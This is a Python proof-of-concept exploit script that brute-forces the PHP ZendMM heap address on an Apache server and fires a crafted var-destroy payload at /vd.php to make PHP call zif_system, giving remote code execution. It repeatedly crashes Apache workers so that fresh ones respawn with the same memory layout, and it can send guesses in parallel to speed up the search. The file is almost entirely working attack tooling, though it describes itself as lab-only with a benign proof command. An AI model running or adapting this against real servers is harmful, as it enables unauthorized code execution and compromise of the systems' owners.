#!/usr/bin/env python3
"""Plan B — brute-force the ZendMM main chunk (no leak, no app precondition).

Measured on this lab: the ZendMM 2 MiB ``main`` chunk has only **9 bits** of
entropy (512 slots), is stable for the life of the Apache parent, and a wrong
guess only kills a *child* (the parent respawns one; addresses do not move).
So the carrier address can be found by scanning.

Carrier = ``main + carrier_delta`` on a fresh worker. libphp lives in the
2 MiB slot at ``main + 0x2000000`` with a 64 KiB-granular offset j, so
``zif_system = main + 0x2000000 + j*0x10000 + zif_offset``.

Usage (zif known, scan main only):
  python3 poc/verify_vardestroy_bruteforce.py --target 127.0.0.1:18150 \
      --container stock-8427 --build 8.4.27 --lib 0xffff8a8c0000

Usage (fully self-contained: scan main x lib-offset):
  python3 poc/verify_vardestroy_bruteforce.py --target 127.0.0.1:18150 \
      --container stock-8427 --build 8.4.27 --fast

Lab-only; fixed benign `id>/tmp/vd`; proof exposed by /proof.php.
"""
import argparse
import importlib.util
import os
import socket
import subprocess
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from php2shell import profiles, probe, vdseed  # noqa: E402

_HERE = os.path.dirname(os.path.abspath(__file__))


def _vd():
    spec = importlib.util.spec_from_file_location(
        "vd", os.path.join(_HERE, "verify_vardestroy_rce.py"))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


VD = _vd()


def sh(container, cmd, timeout=30):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)


# ---------------------------------------------------------------- fast HTTP
def _http(host, port, path, connect_timeout=1.0, read_timeout=1.5,
          retries=3, maxout=512):
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Connection: close\r\n\r\n").encode()
    for _ in range(retries):
        s = None
        try:
            s = socket.create_connection((host, port), timeout=connect_timeout)
            s.sendall(req)
            s.settimeout(read_timeout)
            out = b""
            while len(out) < maxout:
                try:
                    d = s.recv(4096)
                except socket.timeout:
                    break
                if not d:
                    break
                out += d
            return out
        except OSError:
            time.sleep(0.05)
        finally:
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass
    return b""


def _proof(host, port):
    return b"uid=" in _http(host, port, "/proof.php")


def _poison(host, port):
    """Crash the worker via a known-bad pointer -> parent respawns a fresh
    one with the same (fork-inherited) address space."""
    _http(host, port, "/vd.php?d=" + VD.blob(VD.MODE_FIRE, 0x10, 0x10),
          read_timeout=0.10)
    time.sleep(0.05)


def attempt(host, port, container, addr, zif, fast=True):
    """One fire guess. Returns True on proof."""
    path = "/vd.php?d=" + VD.blob(VD.MODE_FIRE, addr, zif)
    resp = _http(host, port, path, read_timeout=1.5)
    if fast:
        if _proof(host, port):
            return True
        # survived a wrong deref => heap dirty; reset for the next guess
        if b"vd done" in resp:
            _poison(host, port)
        return False
    # docker-assisted proof (slow but container-only)
    out = sh(container, "cat /tmp/vd 2>/dev/null").stdout
    if "uid=" in out:
        return True
    if b"vd done" in resp:
        sh(container, "P=$(pgrep -x apache2 | grep -v '^1$' | tail -1); "
                      "kill -9 $P 2>/dev/null")
        time.sleep(0.05)
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18150")
    ap.add_argument("--container", default="stock-8427")
    ap.add_argument("--build", default=None)
    ap.add_argument("--arch", default="aarch64")
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None,
                    help="known libphp base (scan main only)")
    ap.add_argument("--lo", type=lambda x: int(x, 0), default=0xFFFF78000000)
    ap.add_argument("--hi", type=lambda x: int(x, 0), default=0xFFFFC0000000)
    ap.add_argument("--start", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--max-attempts", type=int, default=0)
    ap.add_argument("--lib-slot", type=lambda x: int(x, 0), default=0x2000000)
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None,
                    help="override the carrier delta (calibration)")
    ap.add_argument("--zif-off", type=lambda x: int(x, 0), default=None,
                    help="override the zif_system offset (calibration)")
    ap.add_argument("--jmax", type=int, default=32)
    ap.add_argument("--fast", action="store_true",
                    help="raw-socket loop + /proof.php (no docker in the loop)")
    ap.add_argument("--parallel", type=int, default=1,
                    help="batch K candidates concurrently (needs a "
                         "MaxConnectionsPerChild=1 pool)")
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)

    build = args.build
    if build is None:
        r = sh(args.container, "php -r 'echo PHP_VERSION;'")
        build = r.stdout.strip() or None
    prof = profiles.find(php_version=build, arch=args.arch)
    if prof is None:
        raise SystemExit(f"no profile for {build}/{args.arch}")
    delta = args.delta if args.delta is not None else prof.get("vd_carrier_delta")
    zif_off = args.zif_off if args.zif_off is not None else prof.get("zif_system")
    if delta is None or zif_off is None:
        raise SystemExit(f"profile {build} missing delta/zif offset")

    sh(args.container, "rm -f /tmp/vd")
    if args.fast:
        _poison(host, port)     # start from a fresh worker
    lo = args.start if args.start is not None else args.lo
    step = 0x200000
    lib_deltas = prof.get("vd_lib_deltas")
    if args.lib is not None:
        zif_iter = lambda m: [args.lib + zif_off]  # noqa: E731
        layout = "lib-known"
    elif lib_deltas:
        zif_iter = lambda m: [m + d + zif_off for d in lib_deltas]  # noqa: E731
        layout = f"joint(main x lib, {len(lib_deltas)} deltas)"
    else:
        zif_iter = lambda m: [m + args.lib_slot + j * 0x10000 + zif_off  # noqa: E731
                              for j in range(args.jmax + 1)]
        layout = "joint(main x lib)"

    print(f"[*] {layout} build={build} delta={delta:#x} zif_off={zif_off:#x} "
          f"window={lo:#x}..{args.hi:#x} fast={args.fast}", flush=True)
    def candidates():
        mm = lo
        while mm < args.hi:
            a = mm + delta
            for zz in zif_iter(mm):
                yield mm, a, zz
            mm += step

    def fire_one(a, z):
        _http(host, port, "/vd.php?d=" + VD.blob(VD.MODE_FIRE, a, z),
              read_timeout=1.5)

    n = 0
    t0 = time.time()
    if args.parallel <= 1:
        for m, addr, zif in candidates():
            n += 1
            if attempt(host, port, args.container, addr, zif, args.fast):
                el = time.time() - t0
                print(f"[EVIDENCE] FOUND after {n} attempts ({el:.1f}s): "
                      f"main={m:#x} carrier={addr:#x} zif={zif:#x}", flush=True)
                return 0
            if args.max_attempts and n >= args.max_attempts:
                print(f"[!] stopped at --max-attempts={n}", flush=True)
                return 1
            if n % 200 == 0:
                el = time.time() - t0
                print(f"    {n} attempts {n / el:.0f}/s main={m:#x}", flush=True)
        print(f"[!] exhausted after {n} attempts", flush=True)
        return 1

    # batched parallel scan (fresh-child-per-request pool). Proof appears a
    # few hundred ms after a successful fire, so we check the PREVIOUS batch
    # while the next one is in flight (pipelined detection, no per-batch stall).
    def verify(batch, n, t0):
        el = time.time() - t0
        for m, a, z in batch:
            sh(args.container, "rm -f /tmp/vd")
            if attempt(host, port, args.container, a, z, args.fast):
                print(f"[EVIDENCE] FOUND after {n} attempts ({el:.1f}s): "
                      f"main={m:#x} carrier={a:#x} zif={z:#x}", flush=True)
                return True
        return False

    prev = []
    batch = []
    for m, addr, zif in candidates():
        if prev and _proof(host, port):
            if verify(prev, n, t0):
                return 0
        batch.append((m, addr, zif))
        if len(batch) < args.parallel:
            continue
        ts = [threading.Thread(target=fire_one, args=(a, z)) for _m, a, z in batch]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        n += len(batch)
        prev = batch
        batch = []
        if args.max_attempts and n >= args.max_attempts:
            if _proof(host, port) and verify(prev, n, t0):
                return 0
            print(f"[!] stopped at --max-attempts={n}", flush=True)
            return 1
        if n % 1000 < args.parallel:
            el = time.time() - t0
            print(f"    {n} attempts {n / el:.1f}/s last={prev[-1][0]:#x}",
                  flush=True)
    # trailing partial batch (previously never fired)
    if batch:
        if prev and _proof(host, port) and verify(prev, n, t0):
            return 0
        ts = [threading.Thread(target=fire_one, args=(a, z)) for _m, a, z in batch]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        n += len(batch)
        prev = batch
    if prev and _proof(host, port) and verify(prev, n, t0):
        return 0
    print(f"[!] exhausted after {n} attempts", flush=True)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
